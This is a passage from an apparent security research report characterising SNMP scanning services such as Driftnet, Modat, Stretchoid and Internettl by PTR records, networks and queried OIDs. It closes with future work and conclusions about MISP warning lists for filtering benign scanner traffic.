**cencus.internet-measurement.com**.

Excerpt of records:

- `adored.monitoring.internet-measurement.com`
- `excellent.monitoring.internet-measurement.com`
- `reverent.monitoring.internet-measurement.com`
- `merciful.census.internet-measurement.com`
- `felicitous.census.internet-measurement.com`
- `terrific.census.internet-measurement.com`

We identified 504 IP addresses with corresponding PTR records, all
belonging to Driftnet’s own ASN, **AS211298**. The *monitoring* hosts
reside within the `87.236.176.0/24` range, while the *census* hosts are
located in the `193.163.125.0`

We identified 12 hosts from Modat.io, all belonging to two networks:
**OVH (AS16276)** or **NEWVM (AS201401)**. The PTR records include an
indicator of the originating AS and follow the format:

| PTR                    | AS Name  | AS Number |
|------------------------|----------|----------:|
| `o37.scanner.modat.io` | OVH      |     16276 |

| `n30.scanner.modat.io` | NEWVM-AS |    201401 |
| `n31.scanner.modat.io` | NEWVM-AS |    201401 |

It is not possible to determine the requested OIDs, since Modat only
issues SNMPv3 queries.

| *not visible* |                    |       3 |

The SNMPv1 OID `1.3.6.1.2.1.1.5.0` corresponds to **sysName**, which
should return the system’s configured hostname—its administratively
assigned network name.

Under SNMPv2, the following OIDs are requested:

- **1.3.6.1.2.1.1.1.0 – sysDescr**: high-level textual description of
  the device (hardware, OS, and software version).
- **1.3.6.1.2.1.1.3.0 – sysUpTime**: time elapsed since the device last
  initialized or rebooted.
- **1.3.6.1.2.1.4.3.0 – ipInReceives**: total number of IP datagrams
  received, including those with errors.
- **1.3.6.1.2.1.4.10.0 – ipInDelivers**: number of IP datagrams
  successfully delivered to upper-layer protocols.

Strechoid.com appears to be a little-known network scanner. It has a low
trust rating (10/100 according to ScamMinder) and is flagged by multiple
sources for performing unexpected scans or crawls without a clearly
stated purpose. In addition, the opt-out form on the website does not
appear to validate any fields other than the CIDR ranges, raising
further concerns.

<figcaption aria-hidden="true">Stretchoid home page</figcaption>
</figure>

In our analysis, we identified **343 distinct IP addresses** with
corresponding PTR records following this pattern:

- `azpdesq2p3jd.stretchoid.com`
- `azpdcs88zxbb.stretchoid.com`
- `azpdcsypblgq.stretchoid.com`
- `azpdcg1tehht.stretchoid.com`

The prefix **“azpd”** appears to be constant and may indicate the use of
underlying Microsoft Azure infrastructure. Indeed, the associated IP
addresses are allocated to the Microsoft Azure network
(**MICROSOFT-CORP-MSN-AS-BLOCK, AS8075**).

Strechoid issues only the following SNMP requests in versions 1 and 3:

| community     | oids              | version |
|:--------------|:------------------|--------:|
| public        | 1.3.6.1.2.1.1.1.0 |       1 |
| *not visible* | —                 |       3 |

The OID `1.3.6.1.2.1.1.1.0` corresponds to **sysDescr**, which provides
a high-level textual description of the device (hardware, operating
system, and software version).

#### Internettl

</figure>

Internettl.org is a domain registered in December 2018 and currently
uses privacy-protected WHOIS information. We do not know which company
or organization it is associated with.

We identified 61 IP addresses operated by Internettl, each resolving to
the PTR record **internettl.org**. All of these IPs fall within the
`104.152.52.0/24` range and are announced by **AS14987**, operated by
the U.S.–based provider Rethem Hosting.

Internettl issues queries for both *sysDescr*—a descriptive
identification of the managed node—and *sysName*, which returns the
system’s administratively assigned hostname.

# Future Work

This analysis opens several promising avenues for further research and
operational enhancement for continuous trainings. Building upon the
current findings, future work could focus on the following areas:

- **Vulnerability Signal Extraction:**  
  By refining OID-level and behavior-based analysis, the dataset can be
  leveraged to detect emerging or undisclosed vulnerabilities.
  Identifying anomalous request patterns, unusual MIB walks, or
  vendor-specific probing bursts may provide early indicators of
  exploitation campaigns.

- **Infrastructure and Vendor Profiling:**  
  Extending the classification of vendor-specific OIDs would improve
  visibility into the distribution of devices deployed on the Internet.
  This would support large-scale assessments of ecosystem exposure,
  identify concentrations of outdated or at-risk equipment, and enable
  more precise vendor or product-level threat intelligence.

- **Scanning vs. Noise Discrimination:**  
  Enhancing statistical and temporal models would help distinguish
  intentional scanning operations from background noise,
  misconfigurations, and harmless reconnaissance. This differentiation
  is key for prioritizing alerting logic, improving SOC triage
  efficiency, and reducing false positives.

- **Threat Hunting Enrichment:**  
  Incorporating SNMP-based observables into threat-hunting
  workflows—such as tracking persistent sources, correlating scanning
  behavior with exploitation timelines, or clustering actor-specific
  fingerprints—may uncover early-stage adversary activity.
  Cross-referencing these insights with additional telemetry (passive
  DNS, routing data, or honeypot logs) would further strengthen
  detection capabilities.

Overall, expanding this analysis provides an opportunity to transform
raw SNMP background traffic into actionable intelligence. Continued
research will improve the community’s understanding of Internet-wide
device exposure, scanning ecosystems, and adversarial behavior patterns.

# Conclusions

This analysis provides valuable insights and constitutes a meaningful
contribution to operational security practice. The newly derived [MISP
warning lists](https://github.com/MISP/misp-warninglists)[^16] offer SOC
operators additional classification mechanisms that help reduce
operational fatigue by filtering out predictable or low-value SNMP
scanning activity. At the same time, the characterization of SNMP
traffic enables analysts to better understand protocol behaviors and to
distinguish between benign background scanning and events that warrant
closer investigation. Together, these outcomes strengthen analysts’
ability to prioritize relevant signals and maintain effective
situational.  
Finally our analysis further demonstrates significant limitations in
geolocation source of [identified commercial
scanners](https://arxiv.org/pdf/2412.15696v1)[^17], revealing a
pronounced U.S. predominance among scanning services. This bias
introduces critical detection gaps for geofenced assets, as scanners
disproportionately identify U.S.-based infrastructure while failing to
accurately map non-U.S. geofenced assets.
